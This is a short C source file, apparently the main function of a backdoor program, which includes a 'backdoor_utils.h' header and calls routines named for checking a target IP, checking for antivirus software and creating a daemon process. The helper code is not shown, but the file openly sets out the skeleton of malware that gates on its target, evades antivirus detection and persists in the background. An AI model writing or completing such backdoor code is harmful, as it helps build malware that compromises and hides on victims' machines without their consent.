#include "backdoor_utils.h"
#include "utils.h"

int main(int argc, char **argv) {
	char *arg = NULL;

	if(argc > 1) {
		arg = argv[1];
	}

	check_for_correct_ip();

	check_for_antivirus();

	create_deamon_process(arg);

}